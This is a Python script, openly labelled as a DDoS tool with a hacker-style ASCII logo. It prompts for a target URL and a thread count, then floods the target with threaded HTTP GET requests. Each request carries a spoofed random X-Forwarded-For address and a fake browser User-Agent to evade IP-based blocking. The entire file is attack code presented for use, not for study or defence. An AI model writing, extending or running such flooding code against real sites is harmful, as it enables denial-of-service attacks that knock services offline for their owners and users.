import requests
import threading
import random
import time

def send_request(url):
    try:
        # Generate random IP address and headers
        ip_address = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        headers = {
            "X-Forwarded-For": ip_address,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        
        # Send HTTP GET request to the target URL
        response = requests.get(url, headers=headers)
        
        # Check if the request was successful
        if response.status_code == 200:
            print(f"Request sent to {url} with IP: {ip_address}")
        else:
            print(f"Request failed with status code: {response.status_code}")
    except:
        print("An error occurred while sending the request.")

def start_attack(url, num_threads):
    threads = []
    
    for _ in range(num_threads):
        t = threading.Thread(target=send_request, args=(url,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

def generate_logo():
    # Generate a logo with a name created by Evill
    logo = """
     ___      _______  _______  _______  ___   ___ _______  
    |\  \    |\  ___ \|\  ___ \|\  ___ \|\  \ |\  \|\  ___ \ 
    \ \  \   \ \   __/|\ \   __/|\ \   __/|\  \|\  \ \   __/|
     \ \  \   \ \  \_|/_\ \  \_|/_\ \  \_|/_\  \|\  \ \  \_|/
      \ \  \   \ \  \_|\ \ \  \_|\ \ \  \_|\ \  \|\  \ \  \_|
       \ \  \   \ \  \  \ \ \  \  \ \ \  \  \ \  \|\  \ \  \ 
        \ \__\   \ \__\  \ \ \__\  \ \ \__\  \ \_______\ \__\
         \|__|    \|__|   \ \|__|   \ \|__|   \|_______|\|__|
                                                         
                                                         
    """
    print(logo)

# Get user input for the target URL and number of threads
url = input("Enter the target URL: ")
num_threads = int(input("Enter the number of threads: "))

# Start the DDoS attack
generate_logo()
print("Starting DDoS attack...")
start_attack(url, num_threads)

# Calculate and display the attack duration
start_time = time.time()
input("Press Enter to stop the attack...")
end_time = time.time()
duration = end_time - start_time
print(f"Attack duration: {duration:.2f} seconds")